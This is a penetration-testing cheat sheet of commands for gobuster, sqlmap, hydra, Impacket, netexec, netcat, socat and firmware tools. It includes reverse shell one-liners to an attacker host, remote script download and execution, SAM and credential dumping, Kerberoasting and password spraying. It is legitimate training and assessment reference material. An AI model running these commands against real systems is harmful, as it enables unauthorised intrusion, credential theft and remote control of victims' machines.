# Penetration Testing Tools – Command Cheat Sheet

Practical reference covering tools used in web, binary, Active Directory, general/CTF and IoT/firmware assessments.

---

## 1. Web Application Testing

### gobuster
```bash
# Directory brute-force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt

# Extensions
gobuster dir -u http://<target> -w wordlist.txt -x php,txt,bak,old

# Virtual host discovery
gobuster vhost -u http://<target> -w vhosts.txt

# Status code filtering
gobuster dir -u http://<target> -w wordlist.txt -b 404,403

# Quiet + output file
gobuster dir -u http://<target> -w wordlist.txt -q -o results.txt
```

### sqlmap
```bash
# Basic detection
sqlmap -u "http://<target>/page?id=1"

# Request file from Burp
sqlmap -r request.txt

# Dump database
sqlmap -u "http://<target>/page?id=1" --dbs
sqlmap -u "http://<target>/page?id=1" -D dbname --tables
sqlmap -u "http://<target>/page?id=1" -D dbname -T users --dump

# OS shell / file read
sqlmap -u "http://<target>/page?id=1" --os-shell
sqlmap -u "http://<target>/page?id=1" --file-read="/etc/passwd"

# Tamper scripts & risk level
sqlmap -u "http://<target>/page?id=1" --tamper=space2comment --level=5 --risk=3
```

### Burp Suite (key actions)
```
Proxy → Intercept ON/OFF
Proxy → HTTP history (right-click → Send to Repeater / Intruder)

Intruder:
  - Positions: mark §payload§
  - Payloads: Simple list / Runtime file / Numbers
  - Start attack → sort by status / length / regex

Repeater:
  - Paste request → modify → Send
  - Useful for manual SQLi, LFI, auth bypass testing

Decoder / Comparer / Sequencer for token analysis
```

### curl
```bash
# Headers only
curl -I http://<target>

# Follow redirects + verbose
curl -v -L http://<target>

# POST form
curl -X POST -d "user=admin&pass=admin" http://<target>/login

# Custom header
curl -H "X-Forwarded-For: 127.0.0.1" http://<target>

# Save output
curl -o page.html http://<target>
```

### Ffuf
```bash
# Directory fuzzing
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Extension fuzzing
ffuf -u http://<target>/index.FUZZ -w extensions.txt

# Virtual host fuzzing
ffuf -u http://<target> -H "Host: FUZZ.<target>" -w vhosts.txt

# Filter by status / size
ffuf -u http://<target>/FUZZ -w wordlist.txt -mc 200,301,302 -fs 4242
```

### Whatweb
```bash
whatweb http://<target>
whatweb -a 3 http://<target>          # aggression level 3
whatweb -v http://<target>            # verbose
```

### Nikto
```bash
nikto -h http://<target>
nikto -h http://<target> -Tuning x    # specific tests
nikto -h http://<target> -o report.html -Format html
```

---

## 2. Binary Exploitation & Privilege Escalation

### gdb (with peda)
```bash
# Start quietly
gdb -q <binary>

# Load PEDA (if not in gdbinit)
source /usr/share/gdb-peda/peda.py

# Breakpoints
break main
break *0x08048456
info breakpoints
delete <n>

# Run / continue
run
run <args>
continue
si                  # step instruction
ni                  # next instruction

# Examine registers
info registers
info registers eax
p/x $eax
p/x $eip
p/x $esp

# Examine memory
x/20x $esp
x/10i $eip
x/s $eax
x/20wx $esp

# Search memory (PEDA)
searchmem /bin/sh
searchmem "password"

# Pattern create / offset (PEDA)
pattern_create 200
pattern_offset <value>

# Useful print formats
p/x <expression>     # hex
p/d <expression>     # decimal
p/s <expression>     # string
p/t <expression>     # binary
```

### john
```bash
# Auto-detect and crack
john hashes.txt

# Specify wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=nt hashes.txt
john --format=sha512crypt hashes.txt
john --format=raw-md5 hashes.txt

# Incremental / rules
john --incremental hashes.txt
john --wordlist=wordlist.txt --rules hashes.txt

# Session management
john --session=mysession hashes.txt
john --restore=mysession
```

### Common Privilege Escalation Helpers
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable scripts / cron
find / -writable -type f 2>/dev/null
ls -la /etc/cron*

# Kernel version
uname -a
cat /etc/os-release
```

### Linpeas / Winpeas
```bash
# Transfer and run (Linux)
wget http://<attacker>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Windows
# download winPEAS.exe and execute
```

### Pspy
```bash
# Monitor processes without root
./pspy64
```

### Linux Exploit Suggester
```bash
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --kernelversion <version>
```

---

## 3. Active Directory & Network Enumeration

### nmap
```bash
# Basic host discovery
nmap -sn 192.168.0.0/24

# Service and script scan (safe)
nmap -sC -sV -Pn <target>

# Full TCP port scan
nmap -p- -sV -sC -Pn -T4 <target>

# UDP common ports
nmap -sU -p 53,67,68,69,123,137,138,161,500,514,520,1194 <target>

# OS detection + traceroute
nmap -A -Pn <target>

# Output to files
nmap -sC -sV -Pn -oA scan_results <target>
```

### hydra
```bash
# SMB brute-force
hydra -L users.txt -P passwords.txt smb://<target>

# SSH brute-force
hydra -L users.txt -P passwords.txt ssh://<target>

# HTTP POST form
hydra -L users.txt -P passwords.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# RDP
hydra -L users.txt -P passwords.txt rdp://<target>

# Limit speed / threads
hydra -L users.txt -P passwords.txt -t 4 -w 3 smb://<target>
```

### netexec (nxc)
```bash
# List shares
nxc smb <target> -u <user> -p <pass> --shares

# Authentication check
nxc smb <target> -u users.txt -p passwords.txt

# Command execution
nxc smb <target> -u <user> -p <pass> -x "whoami"

# Spider shares
nxc smb <target> -u <user> -p <pass> --spider <share> --pattern txt

# SAM dump (when privileged)
nxc smb <target> -u <user> -p <pass> --sam
```

### smbclient
```bash
# List shares
smbclient -L //<target> -U <user>

# Connect to a share
smbclient //<target>/<share> -U <user>

# Inside interactive session
ls
cd <directory>
get <filename>
put <localfile>
exit

# Non-interactive download
smbclient //<target>/C$ -U <user>%<pass> -c "get Windows/System32/config/SAM"
```

### Impacket
```bash
# psexec
impacket-psexec domain/user:pass@<target>

# secretsdump
impacket-secretsdump domain/user:pass@<dc>

# GetUserSPNs (Kerberoasting)
impacket-GetUserSPNs -request -dc-ip <dc> domain/user:pass

# GetNPUsers (AS-REP Roasting)
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip <dc> -request

# wmiexec / smbexec
impacket-wmiexec domain/user:pass@<target>
impacket-smbexec domain/user:pass@<target>
```

### Bloodhound
```bash
# Start
bloodhound
# or
neo4j console
# Collect with SharpHound or bloodhound-python
bloodhound-python -d domain.local -u user -p pass -ns <dc> -c All
```

### Enum4linux-ng
```bash
enum4linux-ng <target>
enum4linux-ng -A <target>          # all simple enumeration
```

### Responder
```bash
sudo responder -I eth0
sudo responder -I eth0 -wrf
```

### Kerbrute
```bash
kerbrute userenum -d domain.local --dc <dc> users.txt
kerbrute passwordspray -d domain.local --dc <dc> users.txt Password123
```

---

## 4. General / Post-Exploitation / CTF Utilities

### netcat
```bash
# Listener
nc -lvnp 4444

# Reverse shell (target)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
# or
nc <attacker_ip> 4444 -e /bin/bash

# File transfer
# Receiver
nc -lvnp 4444 > file.out
# Sender
nc <receiver_ip> 4444 < file.in

# Banner grab
nc -nv <target> 80
```

### ssh & key handling
```bash
# Key scan
ssh-keyscan -t rsa,ecdsa,ed25519 <target>

# Fingerprint
ssh-keygen -l -E md5 -f /etc/ssh/ssh_host_rsa_key.pub
ssh-keygen -l -f id_rsa.pub

# Connect with key
ssh -i id_rsa user@<target>

# Generate key pair
ssh-keygen -t rsa -b 4096 -f mykey
```

### Useful One-liners
```bash
# Find readable flag-like files
find / -name "*flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | xargs grep -l -i flag

# Hash a file
md5sum file
sha256sum file

# Base64
echo -n "string" | base64
echo "base64data" | base64 -d

# Process & network
ps aux
ss -tulnp
netstat -tulnp
```

### Masscan
```bash
masscan -p1-65535 <target> --rate=1000
masscan -p80,443,445,3389 <range> --rate=10000 -oL results.txt
```

### Socat
```bash
# Listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Reverse
socat TCP:<attacker>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Proxychains
```bash
proxychains nmap -sT -Pn <target>
proxychains smbclient //<target>/share -U user
```

### Searchsploit
```bash
searchsploit apache 2.4
searchsploit -m 42031
searchsploit -t "Windows 10"
```

---

## 5. IoT & Firmware Analysis

### binwalk
```bash
# Signature scan
binwalk firmware.bin

# Extract filesystems and known types
binwalk -e firmware.bin

# Recursive extract + entropy
binwalk -eM firmware.bin

# Entropy graph
binwalk -E firmware.bin

# Carve specific type
binwalk -D 'png image:png' firmware.bin

# Show only offsets of interest
binwalk --dd='.*' firmware.bin
```

### jefferson
```bash
# Extract JFFS2 filesystem
jefferson jffs2_image.img -d output_dir

# Common workflow after binwalk
binwalk -e firmware.bin
cd _firmware.bin.extracted
jefferson <jffs2_part> -d jffs2_root
```

### sasquatch / unsquashfs
```bash
# Vendor-modified SquashFS
sasquatch squashfs_image.bin

# Standard SquashFS
unsquashfs -d output_dir squashfs_image.bin

# List contents without extracting
unsquashfs -l squashfs_image.bin

# Force endianness / block size if needed
sasquatch -p 1 -le image.bin
```

### radare2
```bash
# Open binary
r2 -A <binary>          # analyze everything
r2 -d <binary>          # debug mode

# Inside radare2
aa                      # analyze all
afl                     # list functions
pdf @ main              # disassemble function
s main                  # seek to main
px 64                   # hex dump
ps                      # print string
iz                      # list strings in data section
izz                     # list all strings
/R <gadget>             # search ROP gadgets
wopO <value>            # generate De Bruijn pattern
wopO 200
```

### Firmwalker
```bash
./firmwalker.sh extracted_filesystem/
```

### Firmware-mod-kit
```bash
# Extract
extract-firmware.sh firmware.bin

# Rebuild
build-firmware.sh
```

---
